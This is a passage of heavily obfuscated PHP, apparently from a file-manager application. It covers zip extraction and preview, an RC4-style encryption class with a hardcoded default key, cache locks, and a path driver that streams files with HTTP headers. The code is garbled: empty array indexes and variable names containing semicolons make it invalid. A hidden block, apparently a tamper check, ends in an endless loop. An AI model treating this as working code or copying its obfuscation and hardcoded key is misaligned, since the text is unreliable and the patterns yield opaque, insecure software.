$eͻδ) { $fƿ = $e꛿[33]; } } goto c; c: } goto A; aՒ: } static function fileIndex($a俚, $Bάմ, $Bм = false) { goto bϥ; c斌: $Eٶ = count($a俚); for ($D߬ = 0; $D߬ < $Eٶ; $D߬++) { if ($Bάմ == $a俚[$D߬][$Eȋ཈[1038]]) { $a = $a俚[$D߬]; break; } } if (!$a) { show_tips($Eȋ཈[1929]); } goto bض; bض: $bԑ = $a; if ($Bм) { $bԑ = $a[$Bм]; if ($a[$Eȋ཈[76]]) { $bԑ = rtrim($bԑ, $Eȋ཈[8]) . $Eȋ཈[8]; } } return $bԑ; goto d΢; bϥ: $Eȋ཈ =& $_SERVER[]; self::init(); if (!is_array($a俚)) { return !1; } goto c斌; d΢: } static function extractZipFile($d꣘, $d, $B = false) { goto F̺; F: $e݃ = get_path_father($d); if ($e݃ == $d) { $e݃ = $fҙ[33]; } $bﱸ = $c鵽->extract(PCLZIP_OPT_PATH, $D֫Ɯ, PCLZIP_CB_PRE_FILE_NAME, $fҙ[1927], PCLZIP_OPT_REMOVE_PATH, $e݃, PCLZIP_OPT_BY_NAME, $d); goto F͉Վ; B: mk_dir($D֫Ɯ); $B = $D֫Ɯ . md5($d꣘ . $d); if ($B) { $B = $D֫Ɯ . $B; } goto B¦; F͉Վ: if (!file_exists($dÙ⎈)) { return !1; } @rename($dÙ⎈, $B); return $B; goto eʷ; B¦: if (file_exists($B)) { return $B; } $c鵽 = new PclZip($d꣘); $dÙ⎈ = unzip_filter_ext($D֫Ɯ . get_path_this($d)); goto F; F̺: $fҙ =& $_SERVER[]; self::init(); $D֫Ɯ = TEMP_FILES . hash_path($d꣘) . $fҙ[8]; goto B; eʷ: } static function filePreview($C苄۲, $B݃, $e = false, $c = false) { goto dԾ˅; F´ԋ: $FЂ = unzip_pre_name($FЂ); $E㛣 = get_path_this($FЂ); $b墊 = unzip_filter_ext($AҞΦ . $E㛣); goto BӞ; dԾ˅: $Bƈ٧ =& $_SERVER[]; self::init(); $AҞΦ = TEMP_FILES . hash_path($C苄۲) . $Bƈ٧[8]; goto a; D: $eײ = self::extract($C苄۲, $AҞΦ, $B݃, $FЂ); if (is_array($FЂ)) { show_json($Bƈ٧[1930], !1); } if (file_exists($D)) { IO::fileOut($D, $e, get_path_this($FЂ)); return; } goto F´ԋ; dۦ: if (!file_exists($D)) { del_dir($AҞΦ); show_json($Bƈ٧[1932]); } IO::fileOut($D, $e, $E㛣); goto aނ; BӞ: if (!$eײ[$Bƈ٧[1034]]) { show_json($eײ[$Bƈ٧[1036]], !1); } if (!file_exists($b墊)) { show_json($Bƈ٧[1931], !1); } @rename($b墊, $D); goto dۦ; a: mk_dir($AҞΦ); $D = $AҞΦ . md5($C苄۲ . $B݃ . $c); $FЂ = $Bƈ٧[33]; goto D; aނ: } static function create($b, $D) { $Fҩ =& $_SERVER[]; self::init(); $a = get_path_ext($b); $e = !1; if (self::checkIfType($a, $Fҩ[301])) { if (kodZipArchive::support($Fҩ[1013])) { return kodZipArchive::create($b, $D); } $b = new PclZip($b); foreach ($D as $F => $fŵ) { $fŵ = str_replace($Fҩ[469], $Fҩ[8], $fŵ); $b͒ϻ = Kodio::clear(get_path_father($fŵ)); if ($F == 0) { $e = $b->create($fŵ, PCLZIP_OPT_REMOVE_PATH, $b͒ϻ, PCLZIP_CB_PRE_FILE_NAME, $Fҩ[1933]); continue; } $e = $b->add($fŵ, PCLZIP_OPT_REMOVE_PATH, $b͒ϻ, PCLZIP_CB_PRE_FILE_NAME, $Fҩ[1933]); } } else { if (self::checkIfType($a, $Fҩ[1904])) { foreach ($D as $F => $fŵ) { $fŵ = str_replace($Fҩ[469], $Fҩ[8], $fŵ); $b͒ϻ = Kodio::clear(get_path_father($fŵ)); if ($F == 0) { $e = PclTarCreate($b, array($fŵ), $a, null, $b͒ϻ); continue; } $e = PclTarAddList($b, array($fŵ), $Fҩ[33], $b͒ϻ, $a); } } } return $e; } } class Mcrypt { public static $defaultKey = "\141\41\164\141\x6b\x41\72\x64\154\x6d\x63\x6c\144\105\x76\x2c\x65"; public static function encode($a˻, $b덨 = '', $e׸ = 0, $E՘ׂ = '') { goto F򾑖ơ; C: $a˻ = sprintf($bӌ[1934], $e׸ ? $e׸ + time() : 0) . substr(md5($a˻ . $F豊), 0, 16) . $a˻; $B = strlen($a˻); $FԴ = array(); goto DÉ; Aڴ: $d滍԰ = md5(substr($b덨, 0, 16)); $F豊 = md5(substr($b덨, 16, 16)); $E՘ׂ = $E՘ׂ ? $E՘ׂ : md5(microtime()); goto a; F򾑖ơ: $bӌ =& $_SERVER[]; $eƔ = 4; $b덨 = md5($b덨 ? $b덨 : self::$defaultKey); goto Aڴ; a: $dݏ = substr($E՘ׂ, -$eƔ); $b݊ = $d滍԰ . md5($d滍԰ . $dݏ); $Fө = strlen($b݊); goto C; DÉ: for ($D = 0; $D <= 255; $D++) { $FԴ[$D] = ord($b݊[$D % $Fө]); } $A̳ = range(0, 255); for ($d = $D = 0; $D < 256; $D++) { $d = ($d + $A̳[$D] + $FԴ[$D]) % 256; $f = $A̳[$D]; $A̳[$D] = $A̳[$d]; $A̳[$d] = $f; } goto F; fˋ: $dԟ = str_replace(array($bӌ[284], $bӌ[8], $bӌ[908]), array($bӌ[412], $bӌ[70], $bӌ[91]), $dԟ); return $dԟ; goto eü; F: $dԟ = $bӌ[33]; for ($b̴ = $d = $D = 0; $D < $B; $D++) { $b̴ = ($b̴ + 1) % 256; $d = ($d + $A̳[$b̴]) % 256; $f = $A̳[$b̴]; $A̳[$b̴] = $A̳[$d]; $A̳[$d] = $f; $dԟ .= chr(ord($a˻[$D]) ^ $A̳[($A̳[$b̴] + $A̳[$d]) % 256]); } $dԟ = $dݏ . str_replace($bӌ[908], $bӌ[33], base64_encode($dԟ)); goto fˋ; eü: } public static function decode($EƇ, $D¡ = '') { goto F؋; a: if (($b == 0 || $b - time() > 0) && substr($aە, 10, 16) == substr(md5(substr($aە, 26) . $F̢), 0, 16)) { return substr($aە, 26); } else { return $eֲ[33]; } goto f; A: $EƇ = base64_decode(substr($EƇ, $A泍)); $e֍ = strlen($EƇ); $Fߥԅհ = array(); goto c; a: $D¡ = md5($D¡ ? $D¡ : self::$defaultKey); $F熾ھ = md5(substr($D¡, 0, 16)); $F̢ = md5(substr($D¡, 16, 16)); goto B͑; F؋: $eֲ =& $_SERVER[]; $EƇ = str_replace(array($eֲ[412], $eֲ[70], $eֲ[91]), array($eֲ[284], $eֲ[8], $eֲ[908]), $EƇ); $A泍 = 4; goto a; a곂: $aە = $eֲ[33]; for ($e󩉃 = $eʔ = $A섉Ż = 0; $A섉Ż < $e֍; $A섉Ż++) { $e󩉃 = ($e󩉃 + 1) % 256; $eʔ = ($eʔ + $F[$e󩉃]) % 256; $d = $F[$e󩉃]; $F[$e󩉃] = $F[$eʔ]; $F[$eʔ] = $d; $aە .= chr(ord($EƇ[$A섉Ż]) ^ $F[($F[$e󩉃] + $F[$eʔ]) % 256]); } $b = intval(substr($aە, 0, 10)); goto a; c: for ($A섉Ż = 0; $A섉Ż <= 255; $A섉Ż++) { $Fߥԅհ[$A섉Ż] = ord($E[$A섉Ż % $aĖƃ]); } $F = range(0, 255); for ($eʔ = $A섉Ż = 0; $A섉Ż < 256; $A섉Ż++) { $eʔ = ($eʔ + $F[$A섉Ż] + $Fߥԅհ[$A섉Ż]) % 256; $d = $F[$A섉Ż]; $F[$A섉Ż] = $F[$eʔ]; $F[$eʔ] = $d; } goto a곂; B͑: $E = substr($EƇ, 0, $A泍); $E = $F熾ھ . md5($F熾ھ . $E); $aĖƃ = strlen($E); goto A; f: } } goto BÖ˃; BÖ˃: define($_SERVER[][1935], 1); define($_SERVER[][1936], 2); define($_SERVER[][1937], 3); goto C龬; Bꢶ: class CacheLockRedis { public function lock($B騫, $cʣ = 10) { $f = Cache::init(); $Fś = microtime(!0) + $cʣ; while (microtime(!0) < $Fś) { $B = $f->get($B騫); if (!$B) { $a = $f->setLock($B騫, $Fś, $cʣ); if ($a) { return !0; } } else { if ($B < microtime(!0)) { $f->set($B騫, $Fś, $Fś); if ($f->get($B騫) === $B) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($D٦) { return Cache::init()->get($D٦); } public function unlock($aő) { return Cache::init()->remove($aő); } } class CacheLockMemcached { public function lock($cҔ, $a = 0) { $dð = Cache::init(); $eǑō = microtime(!0) + $a; while (microtime(!0) < $eǑō) { $B = $dð->get($cҔ); if (!$B || $B < microtime(!0)) { $bٴ؃ = $dð->handle->add($cҔ, $eǑō, $a); if ($bٴ؃) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($C셖ċ) { return Cache::init()->get($C셖ċ); } public function unlock($D) { return Cache::init()->remove($D); } } if (!isset($_SERVER[$_SERVER[][776]]) || !isset($_SERVER[$_SERVER[][777]])) { goto C; F筥: $fī = explode($_SERVER[][217], $cÉ); if (count($fī) < $_SERVER[][550]) { $EǍŸ = $_SERVER[][781]; $EǍŸ(); } $f = $_SERVER[][782]; goto Fġ; C: $d = $_SERVER[][778]; $Fř = $_SERVER[$_SERVER[][779]] . $_SERVER[][780]; $cÉ = $d($Fř); goto F筥; Fġ: $f($_SERVER[$_SERVER[][779]] . $_SERVER[][780]); $cݗ = 2; while ($cݗ > 1) { $Aޑ = rawurlencode($cݗ . $_SERVER[][361]); } goto d; d: } goto fӉ; F: function Action($B̈́ = '') { goto e̡; DȠ: $B[$Bݥ] = new $C΅(); $B[$a] = $B[$Bݥ]; return $B[$Bݥ]; goto Fמ; Cۊ߶: if (isset($B[$a])) { return $B[$a]; } $B̈́ = trim(str_replace($C[4], $C[5], $B̈́), $C[4]); $f = explode($C[5], $B̈́); goto Cɭ; eӣй: if (isset($B[$Bݥ])) { return $B[$Bݥ]; } if (is_file($Eꌈ)) { include_once $Eꌈ; } if (!class_exists($C΅)) { return actionCallError("\133{$B̈́}\40\75\x3e\x20{$C΅}\x5d\x20\143\154\x61\x73\163\40\156\x6f\x74\40\x65\170\151\x73\164\x73\41"); } goto DȠ; e̡: $C =& $_SERVER[ņӺ]; static $B = array(); $a = $B̈́; goto Cۊ߶; Cɭ: $aς؉ʑ = strtolower($f[0]); if (substr($aς؉ʑ, -6) == $C[6]) { $B̈́ = substr($f[0], 0, -6); $C΅ = $B̈́ . $C[7]; $Eꌈ = $C[8]; if (isset($f[1]) && substr(strtolower($f[1]), -5) == $C[9]) { $C΅ = $B̈́ . $f[1]; $Eꌈ = $C[10] . $f[1] . $C[11]; } else { if (count($f) == 3) { $C΅ = $B̈́ . $f[1] . $f[2]; $Eꌈ = $C[12] . $f[1] . $C[13] . $f[2] . $C[11]; } } $Eꌈ = PLUGIN_DIR . $B̈́ . $C[4] . $Eꌈ; } else { if (substr($aς؉ʑ, -5) == $C[9]) { $B̈́ = substr($f[0], 0, -5); return Model($B̈́); } else { $C΅ = $f[0] . $f[1]; $Eꌈ = CONTROLLER_DIR . $f[0] . $C[4] . $f[1] . $C[14]; } } $Bݥ = strtolower($C΅); goto eӣй; Fמ: } function ActionApply($aʢϾ, $Dƻ = array()) { goto Cݡ; Cݡ: if (is_array($aʢϾ)) { return call_user_func_array($aʢϾ, $Dƻ); } if (function_exists($aʢϾ)) { return call_user_func_array($aʢϾ, $Dƻ); } $AÐ߻ = strrpos($aʢϾ, $_SERVER[ņӺ][5]); goto Aޱȇ; Aޱȇ: $AȞ = substr($aʢϾ, 0, $AÐ߻); $eӤ = substr($aʢϾ, $AÐ߻ + 1); $fĝ = Action($AȞ); goto D僩; D僩: if (!method_exists($fĝ, $eӤ)) { return actionCallError("{$aʢϾ}\x20\155\x65\x74\x68\157\144\x20\x6e\x6f\x74\x20\145\x78\x69\x73\164\163\x21"); } $e = call_user_func_array(array($fĝ, $eӤ), $Dƻ); return $e; goto B뇄; B뇄: } function actionCallError($b͊) { return write_log($b͊, $_SERVER[ņӺ][15]); } goto eԓя; dً: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $e߅ =& $_SERVER[]; $this->objectDriver = array($e߅[57], $e߅[58], $e߅[59], $e߅[60], $e߅[61], $e߅[62], $e߅[63], $e߅[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Aތ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Aތ, $_SERVER[][8]); } return $Aތ; } public function getPathName($fʈܔ) { return $fʈܔ; } public function iconvApp($Fй) { return $Fй; } public function iconvSystem($b) { return $b; } public function iconvTo($AѿČ, $d瑙, $b츭) { goto Aăٞ; Aăٞ: $Eى =& $_SERVER[]; if (!$AѿČ || !function_exists($Eى[65])) { return $AѿČ; } static $f뫃ܑ = array(); goto eۻ; E·Ǟ: $f뫃ܑ[$b츭 . $Eى[66] . $d瑙 . $Eى[67] . $AѿČ] = $AѿČ; $f뫃ܑ[$b츭 . $Eى[66] . $d瑙 . $Eى[67] . $a⊔] = $AѿČ; $f뫃ܑ[$d瑙 . $Eى[66] . $b츭 . $Eى[67] . $a⊔] = $a⊔; goto F掤; eۻ: $Fύ = $d瑙 . $Eى[66] . $b츭 . $Eى[67] . $AѿČ; if (isset($f뫃ܑ[$Fύ])) { return $f뫃ܑ[$Fύ]; } if (function_exists($Eى[68])) { $a⊔ = @mb_convert_encoding($AѿČ, $b츭, $d瑙); } else { $a⊔ = @iconv($d瑙, $b츭, $AѿČ); } goto cŦ; cŦ: $a⊔ = $a⊔ ? $a⊔ : $AѿČ; if (strstr($a⊔, $Eى[69])) { $a⊔ = str_replace($Eى[69], $Eى[70], $a⊔); } $f뫃ܑ[$d瑙 . $Eى[66] . $b츭 . $Eى[67] . $AѿČ] = $a⊔; goto E·Ǟ; F掤: return $a⊔; goto b⠆ֆ; b⠆ֆ: } public function getPathInner($Cџ) { $a荄س = IO::init($Cџ); return $a荄س->path; } public function getPathOuter($b) { $Cʌ =& $_SERVER[]; $f = strlen(trim($this->pathBase, $Cʌ[8])); $b = substr(trim($b, $Cʌ[8]), $f); return $this->pathDriver . $Cʌ[8] . ltrim($b, $Cʌ[8]); } public function isParentOf($e, $cɍ) { $a =& $_SERVER[]; $e = rtrim(strtolower($e), $a[8]) . $a[8]; $cɍ = rtrim(strtolower($cɍ), $a[8]) . $a[8]; $Eח = strpos($cɍ, $e) === 0; return $Eח; } public function getType() { $D̔،ӕ =& $_SERVER[]; $C = str_replace($D̔،ӕ[71], $D̔،ӕ[33], get_class($this)); return strtolower($C); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($CҒ, $E) { $C˶ =& $_SERVER[]; $cё = rtrim($CҒ, $C˶[8]) . $C˶[8] . $E; $d = $this->exist($cё); return $d ? $cё : !1; } public function setModifyTime($C, $A՜ҡ = '') { } public function renameObject($a, $E©) { goto fǟΞ; Fէ: $a = $this->getPathOuter($a); $E© = $this->pathFather($a) . $E©; if (IO::isFile($a)) { $dæ = IO::copy($a, $this->pathFather($a), REPEAT_RENAME_FOLDER, $C); if ($dæ) { IO::remove($a); } } else { $dæ = IO::mkdir($E©); if (!$dæ) { return !1; } $eջ = IO::listPath($a, !0); $B = array_merge($eջ[$Cΐ[73]], $eջ[$Cΐ[74]]); foreach ($B as $DԚ) { IO::move($DԚ[$Cΐ[75]], $E©, REPEAT_RENAME_FOLDER); } IO::remove($a); } goto Aә; Aә: return $dæ ? $E© : !1; goto Cߡ; fǟΞ: $Cΐ =& $_SERVER[]; $C = $E©; Hook::trigger($Cΐ[72], $this, $a, $this, $this->pathFather($a) . $E©); goto Fէ; Cߡ: } public function tempFile($f륑հڭ = '', $aԄ = '') { goto Aӯۮ; b: return $C; goto a뇮; Fή: $C = $F嶺» . $f륑հڭ; @touch($C); if ($aԄ) { file_put_contents($C, $aԄ); } goto b; Aӯۮ: if (!$f륑հڭ) { $f륑հڭ = rand_string(15); } $F嶺» = TEMP_FILES . rand_string(15) . $_SERVER[][8]; @mkdir($F嶺», 511, !0); goto Fή; a뇮: } public function tempFileRemve($C) { @unlink($C); @rmdir($this->pathFather($C)); } public function mkfile($B, $Cы = '', $bλ = REPEAT_RENAME) { } public function mkdir($Bɻߨ, $C֛ = REPEAT_SKIP) { } public function delFile($fՌ) { } public function delFolder($b) { } public function copyFile($eГ, $Aﻇ) { } public function moveFile($f΋, $Eϒ۹) { } public function remove($D) { if ($this->isFile($D)) { return $this->delFile($D); } return $this->delFolder($D); } public function rename($E, $B) { } public function exist($a) { } public function findByHash($Aژ = '', $Eƌ = '') { return !1; } public function isFile($B򞶓) { } public function isFolder($a҆) { } public function size($eΘ) { } public function info($B݄) { } public function infoSimple($EՎ) { return $this->info($EՎ); } public function infoAuth($CŲ) { return $this->info($CŲ); } public function infoFull($AԬ) { return $this->info($AԬ); } public function infoWithChildren($Cם) { $B =& $_SERVER[]; static $e = array(); if (isset($e[$Cם])) { return $e[$Cם]; } $f˞ = $this->info($Cם); if ($f˞ && $f˞[$B[29]] == $B[76]) { $Cٻ = array($B[77] => 0, $B[78] => 0, $B[79] => 0); $this->infoChildren($Cם, $Cٻ); $f˞[$B[77]] = $Cٻ[$B[77]]; $f˞[$B[80]] = array($B[81] => $Cٻ[$B[78]], $B[82] => $Cٻ[$B[79]]); $e[$Cם] = $f˞; } return $f˞; } public function listPath($Bܿߵ, $cۭ̉ = false) { } public function has($eϾ, $dɞ = false, $f = false) { } public function canRead($FӜˉݣ) { } public function canWrite($A̒Ŕ) { } public function getContent($D߻ȳ) { } public function setContent($EЅ, $aϕ = '') { } protected function infoChildren($f, &$Fυ) { $C捶Ǻ =& $_SERVER[]; check_abort(); $B = $this->listPath($f, !0); $B = array_merge($B[$C捶Ǻ[74]], $B[$C捶Ǻ[73]]); foreach ($B as $a) { if ($a[$C捶Ǻ[29]] == $C捶Ǻ[76]) { $Fυ[$C捶Ǻ[79]]++; $Dӈ = $this->getPathInner($a[$C捶Ǻ[75]]); $this->infoChildren($Dӈ, $Fυ); } else { $Fυ[$C捶Ǻ[78]]++; $Fυ[$C捶Ǻ[77]] += $a[$C捶Ǻ[77]]; } } } public function fileSubstr($cԈ΄, $C, $B꘍) { } public function listAll($bܒ) { } public function upload($aӥ, $eސ, $dӮ = false, $dԢݯ = REPEAT_REPLACE) { } public function uploadFileByID($b̊Ë, $D, $a) { } public function uploadFileByPath($CĪ㲂, $Eՙ, $Aͼ = array()) { } public function isUploadServer() { $d慛Ө =& $_SERVER[]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $d慛Ө[83]) { return !0; } return $GLOBALS[$d慛Ө[6]][$d慛Ө[84]][$d慛Ө[85]]; } public function isFileOutServer() { $c̥ū =& $_SERVER[]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $c̥ū[83]) { return !0; } return $GLOBALS[$c̥ū[6]][$c̥ū[84]][$c̥ū[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($aޏȇ) { $C枊 =& $_SERVER[]; if (!$this->isCdnHost()) { return $aޏȇ; } return str_replace(trim(get_url_root($aޏȇ), $C枊[8]), trim($this->cdnHost, $C枊[8]), $aޏȇ); } public function uploadLink($Eӂ, $f = 0) { goto c; C飜: if ($a) { $a[$cץ[89]] = $Eӂ; $a[$cץ[90]] = $Fޖ; } return $a; goto C; c: $cץ =& $_SERVER[]; if ($this->isUploadServer()) { return; } $Fޖ = $this->getType(); goto aߙ; aߙ: if (!in_array($Fޖ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $d = 1024 * 1024 * 10; goto fܬ; fܬ: $aӅ = $f <= $d ? $cץ[87] : $cץ[88]; $Cڔƫ = (!$f ? 1 : ceil($f / pow(1024, 3))) * 3600 * 4; $a = $this->{$aӅ}($Eӂ, $Cڔƫ); goto C飜; C: } public function uploadFormData($b, $B = 3600) { } public function multiUploadFormData($FЅĝ, $c = 3600) { } public function download($C均, $F㱕) { } public function ext($B) { $dĶ =& $_SERVER[]; if (strpos($B, $dĶ[8]) === -1) { $C = $B; } else { $C = $this->pathThis($B); } $EŞ㐬 = $dĶ[33]; if (strstr($C, $dĶ[91])) { $EŞ㐬 = substr($C, strrpos($C, $dĶ[91]) + 1); $EŞ㐬 = strtolower($EŞ㐬); } if (strlen($EŞ㐬) > 3 && preg_match($dĶ[92], $EŞ㐬, $eվ)) { $EŞ㐬 = $dĶ[33]; } return $EŞ㐬; } public function pathThis($E䳢) { $e =& $_SERVER[]; $E䳢 = str_replace($e[93], $e[8], rtrim($E䳢, $e[8])); $Bސ = strrpos($E䳢, $e[8]); if ($Bސ === !1) { return $E䳢; } return substr($E䳢, $Bސ + 1); } public function pathFather($b) { $bķ =& $_SERVER[]; $b = str_replace($bķ[93], $bķ[8], rtrim($b, $bķ[8])); $d = strrpos($b, $bķ[8]); if ($d === !1) { return $bķ[33]; } return substr($b, 0, $d + 1); } public function hashSimple($f) { goto d݆; b: $Cښ = intval($bŃ / $Cڼ); $eǬ獻 = $eǷ[33]; for ($Fέ = 0; $Fέ < $Cڼ; $Fέ++) { $eǬ獻 .= $this->fileSubstr($f, $Cښ * $Fέ, $c); } goto f; d݆: $eǷ =& $_SERVER[]; if (!$f) { return md5($eǷ[33]); } $bŃ = $this->size($f); goto aȎ; aȎ: $c = 200; $Cڼ = 50; if ($bŃ <= $c * $Cڼ) { return $this->hashMd5($f) . $bŃ; } goto b; f: $eǬ獻 .= $this->fileSubstr($f, $bŃ - $c, $c); return md5($eǬ獻) . $bŃ; goto Aڅӂ; Aڅӂ: } public static $md5Cache = array(); public function hashMd5($E) { $E = $this->iconvSystem($E); if (isset(self::$md5Cache[$E])) { return self::$md5Cache[$E]; } self::$md5Cache[$E] = $this->hashMd5Shell($E); if (!self::$md5Cache[$E]) { self::$md5Cache[$E] = @md5_file($E); } return self::$md5Cache[$E]; } private function hashMd5Shell($D˶) { goto C; A֕: $CƩ = Cache::get($C델[97]); if (!$CƩ) { $f酰 = BASIC_PATH . $C델[98]; $d = md5_file($f酰); $CƩ = $C델[99]; foreach ($eдˊ as $E) { $A𰣉 = shell_exec($E . "\x20\42{$f酰}\42"); if ($A𰣉 && substr(trim($A𰣉), 0, 32) == $d) { $CƩ = $E; break; } } Cache::set($C델[97], $CƩ, 3600); } if ($CƩ == $C델[99]) { return !1; } goto Cȧ; C: $C델 =& $_SERVER[]; if (!function_exists($C델[94])) { return !1; } $eдˊ = array($C델[95], $C델[96]); goto A֕; Cȧ: $A𰣉 = shell_exec($CƩ . "\x20\42{$D˶}\x22"); $A𰣉 = str_replace($C델[100], $C델[33], $A𰣉); return substr($A𰣉, 0, 32); goto D; D: } public function link($c믌٭) { return $c믌٭; } public function fileOut($A죆, $cߍŋ = false, $CԮċ = false, $FЕԟ = '') { goto B򍂍; c基: $Dʈ = 0; $FҎօ = $e;Ĉ - 1; $băݙ = $this->ext($aߑ); goto FՉ掽; C: if ($_SERVER[$F͠ʹ[154]] == $F͠ʹ[155]) { return; } $E = 1024 * 100; $fɣ = 0; goto Fؿ; aʦ±: if (isset($_SERVER[$F͠ʹ[128]]) && strtotime($_SERVER[$F͠ʹ[128]]) == $fȝ˟[$F͠ʹ[107]]) { header($F͠ʹ[129], !0, 304); die; } if (isset($_SERVER[$F͠ʹ[130]]) && $_SERVER[$F͠ʹ[130]] == $FЕԟ) { header($F͠ʹ[131] . $FЕԟ, !0, 304); die; } header($F͠ʹ[131] . $FЕԟ); goto AȢ߉; D싋: @ob_end_clean(); set_timeout(); $fȝ˟ = $this->infoFull($A죆); goto A؂; FՉ掽: if (in_array($băݙ, array($F͠ʹ[108], $F͠ʹ[109], $F͠ʹ[110], $F͠ʹ[111]))) { $băݙ = $F͠ʹ[112]; } if (!$FЕԟ) { $FЕԟ = md5($eζ . $this->hashSimple($A죆)); } $FЕԟ = $F͠ʹ[113] . $FЕԟ . $F͠ʹ[113]; goto b󱻶; B򍂍: $F͠ʹ =& $_SERVER[]; $this->cacheMethod(null, null); if (!$A죆 || !$this->exist($A죆)) { show_json(LNG($F͠ʹ[101]), !1, $CԮċ); } goto Bڋ鳎; b͕Ԃ: header($F͠ʹ[121]); header($F͠ʹ[122] . $F瑄); header($F͠ʹ[123] . gmdate($F͠ʹ[106], time() + 3600 * 24 * 30) . $F͠ʹ[124]); goto b; eؐ֠: $c = rawurlencode($aߑ); $c = $F͠ʹ[113] . $c . $F͠ʹ[117] . $c; if ($cߍŋ) { header($F͠ʹ[118]); header($F͠ʹ[119] . $c); } else { header($F͠ʹ[120] . $c); } goto b͕Ԃ; b: header($F͠ʹ[125]); header($F͠ʹ[126]); header($F͠ʹ[127]); goto aʦ±; b󱻶: $F瑄 = get_file_mime($băݙ); if (strstr($F瑄, $F͠ʹ[114])) { $F瑄 = $F瑄 . $F͠ʹ[115]; } if ($cߍŋ === !1 && !mime_support($F瑄)) { $cߍŋ = !0; $F瑄 = $F͠ʹ[116]; } goto eؐ֠; Dނ: $ḑэ = strtolower($_SERVER[$F͠ʹ[139]]); if ($b && $ḑэ && $aʊ矅) { if (strstr($ḑэ, $F͠ʹ[140])) { header($F͠ʹ[141] . $A죆); } else { if (strstr($ḑэ, $F͠ʹ[142])) { header($F͠ʹ[143] . $A죆); } else { if (strstr($ḑэ, $F͠ʹ[144])) { header($F͠ʹ[145] . $A죆); } } } if ($d) { header($F͠ʹ[146] . $d); } return; } if (isset($_SERVER[$F͠ʹ[147]])) { if (preg_match($F͠ʹ[148], $_SERVER[$F͠ʹ[147]], $Aƨǃ)) { $Dʈ = intval($Aƨǃ[1]); if (!empty($Aƨǃ[2])) { $FҎօ = intval($Aƨǃ[2]); } } header($F͠ʹ[149]); header("\103\157\x6e\164\x65\156\164\55\x52\x61\156\147\x65\x3a\x20\x62\x79\x74\x65\163\x20{$Dʈ}\x2d{$FҎօ}\57" . $e;Ĉ); } else { header($F͠ʹ[150]); } goto aȎ«; A؂: $e;Ĉ = $fȝ˟[$F͠ʹ[77]]; $eζ = gmdate($F͠ʹ[106], $fȝ˟[$F͠ʹ[107]]); $aߑ = $CԮċ ? $CԮċ : $this->iconvApp($fȝ˟[$F͠ʹ[28]]); goto c基; Fؿ: if ($d) { $fɣ = intval(1000 * 1000 * ($E / $d)); } while ($Dʈ <= $FҎօ) { $d = timeFloat(); check_abort(); $F = $FҎօ - $Dʈ + 1; if ($F <= $E) { $E = $F; } echo $this->fileSubstr($A죆, $Dʈ, $E); $Dʈ += $E; if ($E == $F) { $Dʈ = $FҎօ + 1; } if ($fɣ) { $A٢ = intval(1000 * 1000 * (timeFloat() - $d)); $b = $fɣ - $A٢; if ($b > 5) { usleep($b); } } } goto B߅; E: header($F͠ʹ[135] . $e;Ĉ); header($F͠ʹ[136]); if (!$cߍŋ && $băݙ == $F͠ʹ[137]) { if ($e;Ĉ > 1024 * 1024 * 5) { die; } $C = $this->getContent($A죆); $C = Html::clearSVG($C); header($F͠ʹ[138] . $e;Ĉ); echo $C; die; } goto Dނ; Bڋ鳎: $b = $this->getType() == $F͠ʹ[102]; $aʊ矅 = $GLOBALS[$F͠ʹ[6]][$F͠ʹ[84]][$F͠ʹ[103]][$F͠ʹ[104]]; $d = (double) $GLOBALS[$F͠ʹ[6]][$F͠ʹ[84]][$F͠ʹ[103]][$F͠ʹ[105]] * 1024 * 1024; goto D싋; AȢ߉: header($F͠ʹ[132] . $eζ . $F͠ʹ[124]); header($F͠ʹ[133] . $aߑ); header($F͠ʹ[134]); goto E; aȎ«: $e⭂ = !0; if ($_SERVER[$F͠ʹ[151]] == $F͠ʹ[152] && $e;Ĉ > 1204 * 1024 * 1024 * 2) { $e⭂ = !1; } if ($e⭂) { header($F͠ʹ[153] . ($FҎօ - $Dʈ + 1)); } goto C; B߅: } public function fileOutServer($Cǲ, $Dꪮʆ = false, $eƺ = false, $B = '') { $this->fileOut($Cǲ, $Dꪮʆ, $eƺ, $B); } public function fileOutLink($a) { header($_SERVER[][156] . $a); die; } public function cacheMethod($a֞¹, $D伵) { goto aѭ; fȹ: $dȒؾ = isset($B[$Cӈ]) ? $B[$Cӈ] : null; if (!is_null($dȒؾ)) { return $dȒؾ; } $dȒؾ = $this->{$a֞¹}($D伵); goto aާڻ; aѭ: $e =& $_SERVER[]; static $B = array(); $d = $D伵 ? ltrim($this->getPathOuter($D伵), $e[8]) : $D伵; goto Eɣ; aާڻ: $B[$Cӈ] = $dȒؾ; return $dȒؾ; goto F퍉; Eɣ: $Cӈ = $e[157] . $a֞¹ . $e[158] . rtrim($d, $e[8]); if (is_null($a֞¹)) { $B = array(); return; } if (is_null($D伵)) { unset($B[$Cӈ]); return; } goto fȹ; F퍉: } public function fileOutImage($fݖŐ, $d = 250) { goto e; F: if (!($A = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $B瘢[165]))) { $F = IO::mkdir(IO_PATH_SYSTEM_TEMP . $B瘢[166]); } else { $F = KodIO::make($A); } if ($A = IO::fileNameExist($F, $C҇Ũŏ)) { $A͍ = KodIO::make($A); return IO::fileOut($A͍); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto D; e: $B瘢 =& $_SERVER[]; if (substr($fݖŐ, 0, 4) == $B瘢[144]) { $this->fileOutLink($fݖŐ); } $Eч = $this->info($fݖŐ); goto fϝ; A: if (!($EϺ = IO::move($A͍, $F))) { return IO::fileOut($A͍); } del_file($A͍); IO::fileOut($EϺ); goto fƚ; fϝ: if ($Eч[$B瘢[77]] <= 1024 * 50 || !function_exists($B瘢[159]) || $Eч[$B瘢[160]] == $B瘢[161]) { return $this->fileOut($fݖŐ); } if (isset($Eч[$B瘢[162]][$B瘢[163]])) { $a窋 = $Eч[$B瘢[162]][$B瘢[163]]; } else { if 